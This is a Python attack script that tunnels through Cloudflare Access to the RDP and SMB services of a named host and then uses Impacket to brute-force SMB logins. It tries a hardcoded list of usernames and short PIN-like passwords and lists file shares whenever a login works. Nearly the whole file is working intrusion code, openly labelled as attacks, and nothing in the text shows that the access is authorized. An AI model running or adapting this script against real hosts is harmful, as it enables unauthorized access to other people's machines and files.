import threading
import subprocess
import time
import sys
import json

# Tunnel config
RDP_PORT = 13389
SMB_PORT = 10445


def start_tunnels():
    try:
        with open("rdp_access_creds.json", "r") as f:
            creds = json.load(f)
    except FileNotFoundError:
        print("Creds not found")
        return []

    tunnels = []

    # RDP Tunnel
    cmd_rdp = [
        "cloudflared",
        "access",
        "tcp",
        "--hostname",
        "rdp.ai-smith.net",
        "--url",
        f"localhost:{RDP_PORT}",
        "--id",
        creds["client_id"],
        "--secret",
        creds["client_secret"],
    ]
    tunnels.append(
        subprocess.Popen(cmd_rdp, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    )

    # SMB Tunnel
    cmd_smb = [
        "cloudflared",
        "access",
        "tcp",
        "--hostname",
        "smb.ai-smith.net",
        "--url",
        f"localhost:{SMB_PORT}",
        "--id",
        creds["client_id"],
        "--secret",
        creds["client_secret"],
    ]
    tunnels.append(
        subprocess.Popen(cmd_smb, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    )

    return tunnels


def run_impacket_attacks():
    print("Running Impacket Attacks...")
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, rrp, scmr
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT_NTLMSSP

    target = "127.0.0.1"

    # 1. SMB Null Session / Guest / Creds
    users = ["", "Guest", "melody", "kuro", "Administrator"]
    passwords = ["", "1121", "0114", "password"]

    print(f"\n[SMB] Attacking {target}:{SMB_PORT}")
    for user in users:
        for pwd in passwords:
            try:
                # SMBConnection(remoteName, remoteHost, myName, sess_port)
                # Note: port is the last arg in some versions, or source_port?
                # Impacket SMBConnection defaults to 445. We need to override.
                # Actually SMBConnection doesn't take port in constructor easily in all versions.
                # It uses `sess_port`.

                conn = SMBConnection(target, target, sess_port=SMB_PORT)
                conn.login(user, pwd)
                print(f"  [+] SUCCESS SMB: {user} / {pwd}")

                # If success, try to list shares
                try:
                    shares = conn.listShares()
                    print("    Shares:")
                    for s in shares:
                        print(f"    - {s['NetName']}")
                except:
                    print("    (Failed to list shares)")

                conn.logoff()
            except Exception as e:
                # print(f"  [-] {user}/{pwd}: {e}")
                pass

    # 2. RDP NLA Check (using separate script logic usually, but here we check connectivity)
    # Impacket doesn't have a simple "rdp login" library function exposed as easily.
    # We will skip python-based RDP login for now and trust SMB first.


def main():
    tunnels = start_tunnels()
    print("Tunnels started. Waiting 5s...")
    time.sleep(5)

    try:
        run_impacket_attacks()
    except Exception as e:
        print(f"Attack crashed: {e}")
    finally:
        print("Cleaning up tunnels...")
        for t in tunnels:
            t.terminate()


if __name__ == "__main__":
    main()
